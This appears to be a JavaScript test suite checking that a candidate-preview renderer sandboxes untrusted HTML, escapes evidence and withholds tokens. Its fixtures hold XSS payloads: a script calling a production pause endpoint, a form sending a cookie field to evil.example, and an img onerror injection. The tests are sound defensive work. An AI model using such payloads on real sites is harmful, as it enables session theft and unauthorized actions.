import { test } from "node:test";
import assert from "node:assert/strict";
import { renderPromotionPreview } from "../src/editor-review.js";

test("candidate preview is a scriptless sandbox with deny-default child policy", async () => {
  const response = renderPromotionPreview({
    id: "candidate-1",
    attempt_id: "candidate-1:1",
    evidence_hash: "evidence-1",
    manifest_hash: "manifest-1",
    base_sha: "abc123",
    preview_html: `<script>parent.fetch('/edit/v1/prod/pause')</script>
      <form action="https://evil.example"><input name="cookie"></form>
      <a target="_top" href="https://evil.example">leave</a>`,
  });
  const html = await response.text();

  assert.equal(response.headers.get("cache-control"), "private, no-store");
  assert.equal(response.headers.get("referrer-policy"), "no-referrer");
  assert.match(html, /<iframe[^>]+sandbox=""/);
  assert.doesNotMatch(html, /allow-same-origin|allow-scripts|allow-forms|allow-popups|allow-top-navigation/);
  assert.match(html, /default-src &amp;#x27;none&amp;#x27;/);
  assert.doesNotMatch(html, /<script>parent\.fetch/);
  assert.match(html, /&lt;script&gt;parent\.fetch/);
});

test("candidate evidence is escaped and credentials are never rendered", async () => {
  const response = renderPromotionPreview({
    id: "candidate-1", attempt_id: "candidate-1:1", evidence_hash: "e1",
    manifest_hash: "m1", base_sha: "b1", preview_html: "<p>safe</p>",
    evidence: { gates: [{ name: `<img src=x onerror=alert(1)>`, status: "pass" }] },
    score: { confidence: 0.91 }, ai: { disposition: "hold", reasons: [`</script><script>x</script>`] },
    token: "must-not-render", authorization: "must-not-render",
  });
  const html = await response.text();
  assert.doesNotMatch(html, /must-not-render|<img|<script>x/);
  assert.match(html, /Confidence/);
  assert.match(html, /&lt;img/);
});
